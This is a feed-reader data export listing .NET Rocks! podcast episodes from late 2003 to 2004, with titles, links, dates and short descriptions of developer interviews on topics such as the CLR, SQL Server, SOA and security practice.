{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=81","title":"Joe Stagner on Hacking and Other Lost Arts","published":{"$wrap":"$date","v":1095652800000,"h":"2004-09-20T04:00:00.000Z"},"starred":false,"read":false,"content":"Joe Stagner stopped by to talk about his recent experiences at BorCon, experiences with the Open Source community, Java, and Delphi. In the second half we talked about Rory joining the MSDN evangelism team, VB.NET 2005, the CLR 2.0, XP Service Pack 2 and website security. Joe did a session at TechEd 2004 called \"How Hackers Hack\" which was the number two highest-attended session! This was a great talk with a very talented developer turned evangelist who keeps it real every day. Also, Mail, News of the Week, Weird Wide Webb, Ask Rory, and Richard the Toy Boy.","author":false,"_id":{"$wrap":"$oid","v":811}}
{"k":"0000000082","o":"0000000822","v":"001"}
{"_id":812,"_uid":812,"_dt":1373728934357,"_s":"9b04ef46b1dbea716c7fc6116ea049bd"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=80","title":"Mark Miller on Tool Development","published":{"$wrap":"$date","v":1095048000000,"h":"2004-09-13T04:00:00.000Z"},"starred":false,"read":false,"content":"Mark Miller talks about his experiences developing for Delphi, developing the motion control system for the Teenage Mutant Ninja Turtles stage show, and his masterpiece, CodeRush. Mark is a big advocate of good design. He talks about plug-in architecture, another area of strong expertise, making the case for using plug-ins in everyday software. He also talks about Programmer Ergonomics- keeping fit in a sedentary job, his ideas about the future of software development interfaces, and other interesting topics.","author":false,"_id":{"$wrap":"$oid","v":812}}
{"k":"0000000082","o":"0000000831","v":"001"}
{"_id":813,"_uid":813,"_dt":1373728934358,"_s":"aec161e275bef42997c87d9d2ca6d5c5"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=79","title":"Dave Wecker - Toy Boy","published":{"$wrap":"$date","v":1094443200000,"h":"2004-09-06T04:00:00.000Z"},"starred":false,"read":false,"content":"This weeks show is an interesting conversation with Dave Wecker, a brilliant (we think) architect in the Mobile Platforms Division who is constantly looking for the next thing in mobility, and how to make the mobile platforms better. The conversation spans from his experiences with speech recognition systems, the Tablet PC, microphone arrays, and neural networks to toys, home automation, books, and toys. Did we mention toys? Dave is a Toy Boy like us!  It's people like Dave that make Microsoft the leader in software innovation.","author":false,"_id":{"$wrap":"$oid","v":813}}
{"k":"0000000082","o":"0000000635","v":"001"}
{"_id":814,"_uid":814,"_dt":1373728934359,"_s":"b2471fbbe602626c53919a57587476fd"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=78","title":"Developing with Least Privilege - Don Kiely","published":{"$wrap":"$date","v":1093838400000,"h":"2004-08-30T04:00:00.000Z"},"starred":false,"read":false,"content":"Well-known author, developer, and speaker Don Kiely tells us why it's important to develop software (and do everything else on your PC) running as a non-admin. He offers some advice on what the pitfalls and challenges are as well as the benefits. It's a new world, and the days of running as administrator are over.","author":false,"_id":{"$wrap":"$oid","v":814}}
{"k":"0000000082","o":"0000000759","v":"001"}
{"_id":815,"_uid":815,"_dt":1373728934360,"_s":"ab8c116f0ea2e54befc657e0159dc005"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=77","title":"Charles Petzold on Charles Petzold!","published":{"$wrap":"$date","v":1093233600000,"h":"2004-08-23T04:00:00.000Z"},"starred":false,"read":false,"content":"Charles Petzold talks with Carl and Rory about his books including Programming Windows; Code; and his .NET books, his love of computer and math history, his exploits with early electronic music, and tells some stories from the old days (at the prodding of old friend, Richard Hale Shaw, who was listening to the live stream at the time). This is a great discussion with a great man. Charles has a way of making complex concepts easy to understand.","author":false,"_id":{"$wrap":"$oid","v":815}}
{"k":"0000000082","o":"0000000658","v":"001"}
{"_id":816,"_uid":816,"_dt":1373728934362,"_s":"3987fb8c960fd18c2580e3ea84257e6e"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=76","title":"DotNetNuke! A conversation with Shaun Walker and Jim Duffy","published":{"$wrap":"$date","v":1092542400000,"h":"2004-08-15T04:00:00.000Z"},"starred":false,"read":false,"content":"DotNetNuke is a free ASP.NET based content management system with a huge installbase and support community. Shaun Walker is it's creator, and Jim Duffy is probably its biggest evangelist. This is a great laid-back show in which you'll learn all about DotNetNuke. By the end of the show you'll be rushing off to download it!","author":false,"_id":{"$wrap":"$oid","v":816}}
{"k":"0000000082","o":"0000000447","v":"001"}
{"_id":817,"_uid":817,"_dt":1373728934362,"_s":"4c2ecd21601217e4736081279ebeca4c"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=75","title":"Miguel de Icaza talks Mono!","published":{"$wrap":"$date","v":1091937600000,"h":"2004-08-08T04:00:00.000Z"},"starred":false,"read":false,"content":"Noted developer Miguel de Icaza talks about the Mono project. Ever wanted to run your .NET applications on Linux or a Mac, check out this show!","author":false,"_id":{"$wrap":"$oid","v":817}}
{"k":"0000000082","o":"0000000492","v":"001"}
{"_id":818,"_uid":818,"_dt":1373728934363,"_s":"29d876d261eb977808e0189b7fc93dfc"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=74","title":"Kimberly Tripp on SQL Server","published":{"$wrap":"$date","v":1091332800000,"h":"2004-08-01T04:00:00.000Z"},"starred":false,"read":false,"content":"Kimberly Tripp offers critical insights into SQL Server 2000 addressing Indexing, optimizing procedural code, the nightmare of row-based operations, and more. This show is 2.5 hours long!","author":false,"_id":{"$wrap":"$oid","v":818}}
{"k":"0000000082","o":"0000000524","v":"001"}
{"_id":819,"_uid":819,"_dt":1373728934364,"_s":"69ea25a06cdd04b15b7a16bf26231373"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=73","title":"The CLR Today and Tomorrow with Jeff Richter","published":{"$wrap":"$date","v":1090814400000,"h":"2004-07-26T04:00:00.000Z"},"starred":false,"read":false,"content":"Jeff Richter talks about the 1.1 Common Language Runtime (CLR) and gives a sneak peak at what's coming in the Orcas CLR.  Also, News of the week and Rory's Top 10 reasons why C# is better than VB.NET ;-)","author":false,"_id":{"$wrap":"$oid","v":819}}
{"k":"0000000082","o":"0000000491","v":"001"}
{"_id":820,"_uid":820,"_dt":1373728934365,"_s":"6b77a4ae93e554d7d59d619e8df074f0"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=72","title":"Clemens Vasters Rocks your World","published":{"$wrap":"$date","v":1090209600000,"h":"2004-07-19T04:00:00.000Z"},"starred":false,"read":false,"content":"This week the one and only Clemens Vasters turns on the light about the future of distributed systems and SOA. If you didn't get it before now, you will after listening to this show.","author":false,"_id":{"$wrap":"$oid","v":820}}
{"k":"0000000082","o":"0000000799","v":"001"}
{"_id":821,"_uid":821,"_dt":1373728934366,"_s":"ca6dd69425989b724212b6c4ca686884"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=71","title":"Tim Huckaby on Smart Clients","published":{"$wrap":"$date","v":1089604800000,"h":"2004-07-12T04:00:00.000Z"},"starred":false,"read":false,"content":"Tim Huckaby stops by to talk about his mission of preaching the SmartClient gospel. Tim is always full of fun, great stories, and common sense. Nickolas Landry surprises us by calling in and heckling Tim. Rory does the Google Weirdos and News of the Week, Carl scraps the Linux Vulnerability of the week (it was time) and Richard Campbell (the Toy Boy) reviews the nVidia GeForce 6800 (as well as a not-so-cool toy) and Carl gives one away to a lucky listener! All in all this was a great show!","author":false,"_id":{"$wrap":"$oid","v":821}}
{"k":"0000000082","o":"0000000537","v":"001"}
{"_id":822,"_uid":822,"_dt":1373728934366,"_s":"c24f561a82fad8a36ad148b72795003d"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=70","title":"The Speaker's Lounge","published":{"$wrap":"$date","v":1089000000000,"h":"2004-07-05T04:00:00.000Z"},"starred":false,"read":false,"content":"This week's show is a roundtable discussion with Mark Dunn, Dan Appleman, Bill Vaughn, Kathleen Dollard, Don Kiely, Pat Hynds, Julia Lerman, and Scott Hanselman. See what happens when you get a bunch of geeks on the phone and turn em loose!","author":false,"_id":{"$wrap":"$oid","v":822}}
{"k":"0000000082","o":"0000000513","v":"001"}
{"_id":823,"_uid":823,"_dt":1373728934367,"_s":"30e03065b66b59931e69e507c6fe605d"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=69","title":"Richard Campbell Geeks Out","published":{"$wrap":"$date","v":1088395200000,"h":"2004-06-28T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Rory geek out with Richard Cambpell about everything but programming! Topics include water-cooled PCs, wireless gear, and flying cars. Yeah, it's not about .NET, but for crying out loud, live a little!","author":false,"_id":{"$wrap":"$oid","v":823}}
{"k":"0000000082","o":"0000000901","v":"001"}
{"_id":824,"_uid":824,"_dt":1373728934368,"_s":"75281be6ede388909deefc52242662ca"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=68","title":"Benjamin Mitchell and John Bristowe on SOA and Web Services","published":{"$wrap":"$date","v":1087790400000,"h":"2004-06-21T04:00:00.000Z"},"starred":false,"read":false,"content":"This week we had a very informative discussion about messaging with Benjamin Mitchell and John Bristowe. Benjamin and John cut through the WS-AlphabetSoup set of specifications, avoid frequent references to SOA and cover what the benefits of web services are, why you might want to use WSE (security, policy, addressing and support for TCP), how to use web services in your applications today and where Microsoft is heading with web services and Indigo in future.  Michele Leroux Bustamante joined us unexpectedly in the second half, and she even told a great joke!","author":false,"_id":{"$wrap":"$oid","v":824}}
{"k":"0000000082","o":"0000000622","v":"001"}
{"_id":825,"_uid":825,"_dt":1373728934369,"_s":"d80d7b9e1ba2c0dbd8266224916a159f"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=67","title":"John Alexander and Barry Gervin on Unit Testing","published":{"$wrap":"$date","v":1087185600000,"h":"2004-06-14T04:00:00.000Z"},"starred":false,"read":false,"content":"John and Barry talk with us about Test-Driven Development, Unit Testing, and other aspects of Extreme Programming that are being used today. We had given lip service to unit testing in past shows, but John and Barry were able to explain the benefits as well as the how-to of test-driven development","author":false,"_id":{"$wrap":"$oid","v":825}}
{"k":"0000000082","o":"0000000636","v":"001"}
{"_id":826,"_uid":826,"_dt":1373728934370,"_s":"b8774b7da66ec62b9fd4b33b2f16a7a2"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=66","title":"Rocky Lhotka (Again!)","published":{"$wrap":"$date","v":1086580800000,"h":"2004-06-07T04:00:00.000Z"},"starred":false,"read":false,"content":"Rocky Lhotka talks about his new book, the CSLA framework, and makes the case for business objects in this world of DataSets and XML. He also talked a bit about WhiteHorse, Microsoft's new designers for SOA and classes shipping in the Whidbey timeframe. This was a great show, and we're always glad to talk to Rocky about all things .NET.","author":false,"_id":{"$wrap":"$oid","v":826}}
{"k":"0000000082","o":"0000001300","v":"001"}
{"_id":827,"_uid":827,"_dt":1373728934371,"_s":"acd5831e13ce13aee4db1766f061c3f4"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=65","title":"TechEd 2004","published":{"$wrap":"$date","v":1086062400000,"h":"2004-06-01T04:00:00.000Z"},"starred":false,"read":false,"content":"In this, our first show after a much-needed vacation, we take you to TechEd 2004 in San Diego. We walked around on the show floor and talked to some of our former and future guests about TechEd, what's new, and what they're interested in.We recorded most of this show on video, and as such will be airing \".NET Rocks! The Movie\" as soon as we possibly can. Until then, enjoy some of the more interesting sonic tidbits of the film.In the first half we spoke to Tim Huckaby, Keith Nicholson, Billy Hollis, Don Kiely, Stephen Forte, Don Box, and Jon Lam.In the second half, we spent about 40 minutes in an INETA Birds Of a Feather (BOF) Session that we recorded Sunday night, in which Bob Reselman showed up and got things juiced up. There is also a lot of obvious interest in the Visual Studio Team System, which was announced at TechEd. We spoke with Paul Sheriff, Brian Noyes, and Chris Kinsman about their impressions of the Team System, and then we caught up with some Microsft team members to talk about it.","author":false,"_id":{"$wrap":"$oid","v":827}}
{"k":"0000000082","o":"0000000662","v":"001"}
{"_id":828,"_uid":828,"_dt":1373728934373,"_s":"d07d027c34c42fe6e1416cc08c538051"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=64","title":"Reflections on Connections","published":{"$wrap":"$date","v":1084766400000,"h":"2004-05-17T04:00:00.000Z"},"starred":false,"read":false,"content":"What started out as a show about the DevConnections Developer Conference morphed into a round-table chat with Dan Appleman, Kathleen Dollard, Mark Dunn, Don Kiely, Robert Scoble, Chris Sells, and Bill Vaughn about developer conferences like DevConnections, writing books, speaking, and various other aspects of the industry. Of course, it was lots of fun too.","author":false,"_id":{"$wrap":"$oid","v":828}}
{"k":"0000000082","o":"0000000628","v":"001"}
{"_id":829,"_uid":829,"_dt":1373728934374,"_s":"b54304af1e9e4fcd4ea40c6f06883c50"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=63","title":"Kathleen Dollard on Code Generation","published":{"$wrap":"$date","v":1084161600000,"h":"2004-05-10T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Rory chat with noted author, developer, and MVP Kathleen Dollard about Code Generation, or writing code that writes code. Don Kiely also shows up to talk about working with Kathleen on her book Code Generation in .NET. Carl and Rory also check in with Sunny Day to talk about the price of gasoline in Maine.","author":false,"_id":{"$wrap":"$oid","v":829}}
{"k":"0000000082","o":"0000000735","v":"001"}
{"_id":830,"_uid":830,"_dt":1373728934375,"_s":"ca2342125fe0f932baed68ac35b4cdd7"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=62","title":"DonXML Talks XML","published":{"$wrap":"$date","v":1083556800000,"h":"2004-05-03T04:00:00.000Z"},"starred":false,"read":false,"content":"Rory somehow convinced DonXML to drive up to the .NET Rocks! Studios for our first Thursday-night live show.Don Demsak (a.k.a. DonXML) is all about XML and related technologies, and as such he told us Why XML? for the as-of-yet unbeliever. Other topics include what the community gets wrong with XML, what's wrong with typed datasets, Object Constraint Language (OCL), what's wrong with the XML DOM, declarative programming and XAML, and SVG.","author":false,"_id":{"$wrap":"$oid","v":830}}
{"k":"0000000082","o":"0000000824","v":"001"}
{"_id":831,"_uid":831,"_dt":1373728934376,"_s":"ec0b4dce7c3c5fe3b6d03a3f194ac59f"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=61","title":"Vic Gundotra, Steve Cellini, Lenn Pryor, and members of the MS Longhorn Evangelism team","published":{"$wrap":"$date","v":1082995200000,"h":"2004-04-26T16:00:00.000Z"},"starred":false,"read":false,"content":"In the first hour Vic Gundotra and Steve Cellini from Microsoft talk about Longhorn and Evangelism at Microsoft. Evangelists are concerned with getting technical information to the developer community. During the break, Rory interviews the MSDN Channel 9 team about Channel 9After the break, Lenn Pryor and some of the Channel 9 team join Carl and Rory for more talk about Longhorn and Microsoft's efforts to get technical information to developers everywhere.","author":false,"_id":{"$wrap":"$oid","v":831}}
{"k":"0000000082","o":"0000000595","v":"001"}
{"_id":832,"_uid":832,"_dt":1373728934377,"_s":"59c4a8cdcf9905aab791ffa1d9172a76"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=60","title":"Keith Pleas and Harry Pierson on Architecture","published":{"$wrap":"$date","v":1082390400000,"h":"2004-04-19T16:00:00.000Z"},"starred":false,"read":false,"content":"This show is all about architecture from Why to How. Keith and Harry bring the developer's and architect's perspective to the discussion, respectively. The discussion starts with the importance of good design and architecture, to techniques, tools, standards, and the like.","author":false,"_id":{"$wrap":"$oid","v":832}}
{"k":"0000000082","o":"0000000541","v":"001"}
{"_id":833,"_uid":833,"_dt":1373728934378,"_s":"30305a5e821c15f14166fbb11917f7c4"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=59","title":"Bob Reselman - Coding Slave and the Meaning of Life","published":{"$wrap":"$date","v":1081785600000,"h":"2004-04-12T16:00:00.000Z"},"starred":false,"read":false,"content":"This week's guest is Bob Reselman , author of Coding Slave, a book that claims the software industry doesn't want you to read it. We'll be talking about software, outsourcing, technology, and of course - the book.","author":false,"_id":{"$wrap":"$oid","v":833}}
{"k":"0000000082","o":"0000000628","v":"001"}
{"_id":834,"_uid":834,"_dt":1373728934379,"_s":"35570cf36cdb026382c567f9f88fbc25"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=58","title":"Tony Bain on SQL","published":{"$wrap":"$date","v":1081180800000,"h":"2004-04-05T16:00:00.000Z"},"starred":false,"read":false,"content":"Tony Bain talks with Rory and Chris Sells about the issues developers face when building SQL Server based applications. Topics include optimization strategies and tools, how DBAs can help, transaction and concurrency control, locking, isolation levels, good database design, and good strategies for accessing SQL from Visual Studio.NET","author":false,"_id":{"$wrap":"$oid","v":834}}
{"k":"0000000082","o":"0000000473","v":"001"}
{"_id":835,"_uid":835,"_dt":1373728934380,"_s":"b38a6510a79e3a6212b08fa405906fdd"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=57","title":"Markus Egger on OOP and Tablet PCs","published":{"$wrap":"$date","v":1080577050000,"h":"2004-03-29T16:17:30.000Z"},"starred":false,"read":false,"content":"Markus Egger of CoDe Magazine and EPS Software fame joins Carl and Rory this week to talk about OOP, Windows Forms, Visual Inheritance, and Tablet PC development.","author":false,"_id":{"$wrap":"$oid","v":835}}
{"k":"0000000082","o":"0000000868","v":"001"}
{"_id":836,"_uid":836,"_dt":1373728934381,"_s":"2dc0d1e248b582fb4cb165b427ad0be2"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=56","title":"Box and Fox on .NET Rocks!","published":{"$wrap":"$date","v":1079999701000,"h":"2004-03-22T23:55:01.000Z"},"starred":false,"read":false,"content":"Jon Box and Dan Fox are on the show this week talking about smart devices, the Compact Framework, and their book, \"Building Solutions with the Microsoft .NET Compact Framework\"Even if you are not currently developing for smart devices, this show is worth the listen. Jon and Dan talk about smart device past, present, and future, and offer real insights into and development strategies for development with the .NET Compact Framework.Topics include pInvoke, memory usage, UI design, storage, local file access, synchronization, asynchronous programming, and more.","author":false,"_id":{"$wrap":"$oid","v":836}}
{"k":"0000000082","o":"0000000743","v":"001"}
{"_id":837,"_uid":837,"_dt":1373728934382,"_s":"36cbe3642c950720c2a32b17078c8955"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=55","title":"Kevin McNeish on OOP Process","published":{"$wrap":"$date","v":1079379909000,"h":"2004-03-15T19:45:09.000Z"},"starred":false,"read":false,"content":"Carl and Rory talk with Kevin about ObjectSpaces (a new business object management tool coming in the Whidbey timeframe), UML, Object Role Modeling (ORM), Visio, and his Mere Mortals Framework, an application framework for .NET developers based on best practices and patterns. This is a good show for anyone interested in using patterns and practices, maximizing development time, and tools the help you design and build business objects.","author":false,"_id":{"$wrap":"$oid","v":837}}
{"k":"0000000082","o":"0000000988","v":"001"}
{"_id":838,"_uid":838,"_dt":1373728934383,"_s":"183059ac10baad6f2d9ef39a69584d7a"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=54","title":"Carl Prothman on ADO.NET","published":{"$wrap":"$date","v":1078724354000,"h":"2004-03-08T05:39:14.000Z"},"starred":false,"read":false,"content":"This week, Carl and Rory talk with noted ADO and ADO.NET guru Carl Prothman about ASP.NET, being an MVP, INETA, ADO.NET, ASP.NET Security and Visual Studio.NET.There were lots of callers during the show. This may be the best show we've ever done on ADO and ADO.NET issues. CP also talked about how to prevent the most common types of ASP.NET attacks.Regular segments: Fan mail, Google Weirdos, Linux Vulnerability of the week, and a lucky listener wins a copy of Windows Server 2003 Enterprise with 25 licenses compliments of the Microsoft Regional Director ProgramRory also unleashed some of his own music during the intermission! All in all, this is a very informative and lively show.","author":false,"_id":{"$wrap":"$oid","v":838}}
{"k":"0000000082","o":"0000000683","v":"001"}
{"_id":839,"_uid":839,"_dt":1373728934384,"_s":"d0a4981782dc987dda129ed717f16173"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=53","title":"All About DevDays","published":{"$wrap":"$date","v":1079414337000,"h":"2004-03-16T05:18:57.000Z"},"starred":false,"read":false,"content":"Chris Flores, Jay Roxe, and Brian Goldfarb from Microsoft tell developers what they can expect from DevDays, a one-day conference in your local area hosted by Microsoft and your local Regional Director.For about a hundred bucks you can get the PDC build of Whidbey and some incredible sample code that you can use right away to build and secure smart client and ASP.NET applications.1 Hour","author":false,"_id":{"$wrap":"$oid","v":839}}
{"k":"0000000082","o":"0000001001","v":"001"}
{"_id":840,"_uid":840,"_dt":1373728934385,"_s":"44cd7dece7d2c0f9760aa94c96cb0ea2"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=52","title":"Ted Neward and Bruce Tate talk Java","published":{"$wrap":"$date","v":1078170840000,"h":"2004-03-01T19:54:00.000Z"},"starred":false,"read":false,"content":"Ted Neward and Bruce Tate talk about the relationship between Java and .NET, underscoring the issues with interop between the two platforms.Also discussed: cultural differences between the Java and .NET communities, the Pet Store Benchmark, the Jump Toolkit and J#, Naked Objects, unit testing, refactoring, the Standard Widget Toolkit, Mono, Rotor, Java on the client vs on the server, Swing, Sun vs Microsoft ideology, rabid zealotry in the Java community, languages vs platforms,  open source, and the future of Java IDEs.Dan Appleman stopped by to talk about languages and what's new at Desaware.As always, Rory does Google Weirdos, and Carl exposes the Linux Vulnerability of the Week","author":false,"_id":{"$wrap":"$oid","v":840}}
{"k":"0000000082","o":"0000000792","v":"001"}
{"_id":841,"_uid":841,"_dt":1373728934386,"_s":"bbce6408c8d2563db8e4268f852563d9"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=51","title":"Scott Hanselman takes on ASP.NET - LIVE!","published":{"$wrap":"$date","v":1077512225000,"h":"2004-02-23T04:57:05.000Z"},"starred":false,"read":false,"content":"He's back and he's pissed! Not really, but we've always wanted to say that. Scott Hanselman talks with Carl and Rory about the following:* ASP.NET* Declarative Programming* \"Word Documents have no teeth\"* Client Side Validation* Code Generation - CodeSmith* Caching* Performance Counters in ASP.NET* Perf Testing* \"A caste system for APIs\"* other ideas: blogging trends, usenet, google, toolbars, future interfaces,* where he's speaking this quarter....* DevDays* Whidbey","author":false,"_id":{"$wrap":"$oid","v":841}}
{"k":"0000000082","o":"0000000958","v":"001"}
{"_id":842,"_uid":842,"_dt":1373728934387,"_s":"7511621aee002f62f44745a4b89d9fdc"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=50","title":".NET Success Stories Part 2","published":{"$wrap":"$date","v":1076905924000,"h":"2004-02-16T04:32:04.000Z"},"starred":false,"read":false,"content":"In this, the second installment in our ongoing \".NET Success Stories\" series, Carl talks with Jesse Ezell and Chris Kinsman about projects they have developed and successfully deployed with Microsoft .NET languages, tools, and technologies.Chris talks about a huge project done for an insurance company that successfully uses ASP.NET and Windows Forms with autodeployment. As well, he talks about some applications he wrote for slot machine management at a casino.In the second half, Jesse Ezell discusses an application he helped develop for Articulate Software that utilizes Flash as a server application to convert Powerpoint presentations to Flash.","author":false,"_id":{"$wrap":"$oid","v":842}}
{"k":"0000000082","o":"0000000522","v":"001"}
{"_id":843,"_uid":843,"_dt":1373728934388,"_s":"f84a800086f491c932a26c337dc30309"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=49","title":"Carl Franklin interviewed by Chris Sells and Rory","published":{"$wrap":"$date","v":1076359387000,"h":"2004-02-09T20:43:07.000Z"},"starred":false,"read":false,"content":"Chris Sells and Rory Blyth interview Carl about communications programming (serial, sockets, and MIDI), teaching, and the meaning of life. It's a fun and informative show, that you shouldn't miss.","author":false,"_id":{"$wrap":"$oid","v":843}}
{"k":"0000000082","o":"0000001080","v":"001"}
{"_id":844,"_uid":844,"_dt":1373728934389,"_s":"c1314ef56ed258ebfa3c6cd5e683deb3"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=48","title":".NET Rocks! Live!","published":{"$wrap":"$date","v":1075495387000,"h":"2004-01-30T20:43:07.000Z"},"starred":false,"read":false,"content":"Hey, it's our first Live .NET Rocks! Show EVER! Oh yeah, we recorded a show live at the PDC, but we didn't broadcast it live! What's more, Carl's co-host is none-other than the infamous Rory BlythThis show is 2 hours long, and commenced Friday, January 30, 2004 at 12PM EST, 9AM PST.In the first hour, Bill Vaughn and Peter Blackburn talk about SQL Reporting Services, Microsoft's foray into the data reporting market.In the second hour, Carl and Rory welcome noted VB and PC guru Dan Appleman to talk about marketing hype, how developers are spending their time, and his new book Always Use ProtectionRory is moving to New London March 1st. So, the new live show format will commence March 5th, and will be only format for .NET Rocks! going forward. Remember! Friday's at Noon Eastern!","author":false,"_id":{"$wrap":"$oid","v":844}}
{"k":"0000000082","o":"0000000782","v":"001"}
{"_id":845,"_uid":845,"_dt":1373728934390,"_s":"d8bff6b0c6f09d5b6526c0adbe36e502"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=47","title":"Brian Noyes on ClickOnce","published":{"$wrap":"$date","v":1075149787000,"h":"2004-01-26T20:43:07.000Z"},"starred":false,"read":false,"content":"In our first post-Mark show, Carl interviews developer and author Brian Noyes. Brian has focused his studies and development efforts on Smart Client development, and in this interview brings us from AutoDeployment of Windows Forms applications into ClickOnce, the next-generation deployment and update technology from Microsoft that will ship with the .NET Framework 2.0.  We talk about the issues around AutoDeployment, and how Microsoft is addressing those issues with ClickOnce.","author":false,"_id":{"$wrap":"$oid","v":845}}
{"k":"0000000082","o":"0000000703","v":"001"}
{"_id":846,"_uid":846,"_dt":1373728934391,"_s":"8e66c8a8726909e42ab3eca7f5fc2d89"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=46","title":"Rory Blyth on Rory Blyth","published":{"$wrap":"$date","v":1074544987000,"h":"2004-01-19T20:43:07.000Z"},"starred":false,"read":false,"content":"In this, Mark's last show, Carl and Mark welcome Rory Blyth, who writes a very popular blog at neopoleon.com. Rory's blog has become well known at Microsoft and in the .NET blogsphere in general.Rory talks about the .NET community and the Open Source Software (OSS) community, writing, blogging, driving to the PDC from Las Vegas, Longhorn, and lots of other great stuff.  This one is not to be missed!","author":false,"_id":{"$wrap":"$oid","v":846}}
{"k":"0000000082","o":"0000000636","v":"001"}
{"_id":847,"_uid":847,"_dt":1373728934392,"_s":"d80582740fe652e06402df1f11c3ff0d"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=45","title":"Sam Gentile on COM Interop","published":{"$wrap":"$date","v":1073940187000,"h":"2004-01-12T20:43:07.000Z"},"starred":false,"read":false,"content":"Carl and Mark have a chat with Sam Gentile (pronounced gen-TILL-ee) about sci-fi authors, COM Interop's problems, Extreme Programming, dual programming, unit testing, Sam's thoughts on the state of the .NET Framework, Groove, what's wrong with Com Interop, the cross-platform potential of the .NET Framework, the CLI, Rotor and Mono.","author":false,"_id":{"$wrap":"$oid","v":847}}
{"k":"0000000082","o":"0000000555","v":"001"}
{"_id":848,"_uid":848,"_dt":1373728934393,"_s":"43a13d6b3f8897732a78937ac1e6f4c7"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=44","title":"Don Box on SOAP and WSE","published":{"$wrap":"$date","v":1073335387000,"h":"2004-01-05T20:43:07.000Z"},"starred":false,"read":false,"content":"Carl and Mark have a chat with the one and only Don Box about SOAP, WSE, Longhorn, Indigo, COM, the PDC, Band on the Runtime, and the meaning of life. Don reveals a few gems about Indigo, and talks about the ways in which Indigo makes web services better.","author":false,"_id":{"$wrap":"$oid","v":848}}
{"k":"0000000082","o":"0000000651","v":"001"}
{"_id":849,"_uid":849,"_dt":1373728934394,"_s":"b71c013a6d45fce997b910428646960b"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=43","title":"Robert Green on Visual Studio Tools for Office","published":{"$wrap":"$date","v":1071504000000,"h":"2003-12-15T16:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Mark talk to Robert about the new Visual Studio Tools for Office, VBA, XML, Office and DataSets, Scripting, and using Word and Excel as the User Interface layer for your .NET framework applications.Robert also talks about some features of up-coming versions of these tools in the Whidbey timeframe. This is great stuff!","author":false,"_id":{"$wrap":"$oid","v":849}}
{"k":"0000000082","o":"0000000668","v":"001"}
{"_id":850,"_uid":850,"_dt":1373728934395,"_s":"d1d05d7d6aa1f3687065e7cff4189d8d"}
